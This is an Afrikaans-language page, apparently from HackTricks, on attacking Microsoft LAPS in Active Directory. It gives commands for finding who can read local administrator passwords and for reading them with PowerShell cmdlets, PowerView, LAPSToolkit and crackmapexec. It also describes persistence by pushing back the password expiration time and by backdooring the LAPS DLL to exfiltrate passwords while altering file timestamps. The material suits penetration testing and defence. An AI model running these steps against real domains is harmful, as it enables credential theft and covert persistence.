# LAPS

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basiese Inligting

Local Administrator Password Solution (LAPS) is 'n instrument wat gebruik word vir die bestuur van 'n stelsel waar **administrateurs wagwoorde**, wat **uniek, willekeurig en gereeld verander** is, toegepas word op domein-gekoppelde rekenaars. Hierdie wagwoorde word veilig binne Active Directory gestoor en is slegs toeganklik vir gebruikers wat toestemming gekry het deur middel van Toegangsbeheerlyste (ACL's). Die veiligheid van die wagwoord-oordragte van die kliënt na die bediener word verseker deur die gebruik van **Kerberos-weergawe 5** en **Advanced Encryption Standard (AES)**.

In die domein se rekenaarvoorwerpe, lei die implementering van LAPS tot die byvoeging van twee nuwe eienskappe: **`ms-mcs-AdmPwd`** en **`ms-mcs-AdmPwdExpirationTime`**. Hierdie eienskappe stoor onderskeidelik die **plain-text-administrateurwagwoord** en **die vervaldatum daarvan**.

### Kontroleer of geaktiveer is
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Wagwoord Toegang

Jy kan die **rofweg LAPS beleid aflaai** vanaf `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` en dan die **`Parse-PolFile`** van die [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pakkie kan gebruik word om hierdie lêer na 'n mens-leesbare formaat te omskep.

Verder kan die **inheemse LAPS PowerShell cmdlets** gebruik word as hulle op 'n masjien geïnstalleer is waarop ons toegang het:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** kan ook gebruik word om uit te vind **wie die wagwoord kan lees en dit kan lees**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Die [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) fasiliteer die opname van LAPS met verskeie funksies. Een daarvan is die ontleding van **`ExtendedRights`** vir **alle rekenaars met LAPS wat geaktiveer is.** Dit sal **groepe** spesifiek wys wat **gedelegeer is om LAPS-wagwoorde te lees**, wat dikwels gebruikers in beskermde groepe is. 'n **Rekening** wat 'n rekenaar by 'n domein gevoeg het, ontvang `Alle Uitgebreide Regte` oor daardie gasheer, en hierdie reg gee die rekening die vermoë om wagwoorde te lees. Opname kan 'n gebruikersrekening wys wat die LAPS-wagwoord op 'n gasheer kan lees. Dit kan ons help om **spesifieke AD-gebruikers** te teiken wat LAPS-wagwoorde kan lees.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS-wagwoorde met Crackmapexec**
Indien daar geen toegang tot 'n Powershell is nie, kan jy hierdie voorreg afstandbeheer misbruik deur LDAP te gebruik.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Volharding**

### **Vervaldatum**

Sodra admin, is dit moontlik om die wagwoorde te bekom en te voorkom dat 'n masjien sy wagwoord opdateer deur die vervaldatum in die toekoms in te stel.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Die wagwoord sal steeds herstel word as 'n **admin** die **`Reset-AdmPwdPassword`** cmdlet gebruik; of as **Moenie toelaat dat die wagwoordvervaltyd langer as vereis deur beleid** geaktiveer is in die LAPS GPO.
{% endhint %}

### Agterdeur

Die oorspronklike bronkode vir LAPS kan gevind word [hier](https://github.com/GreyCorbel/admpwd), daarom is dit moontlik om 'n agterdeur in die kode te plaas (binne die `Get-AdmPwdPassword` metode in `Main/AdmPwd.PS/Main.cs` byvoorbeeld) wat op een of ander manier **nuwe wagwoorde eksfiltreer ofêrens stoor**.

Kompilieer dan net die nuwe `AdmPwd.PS.dll` en laai dit op na die masjien in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (en verander die wysigingstyd).

## Verwysings
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
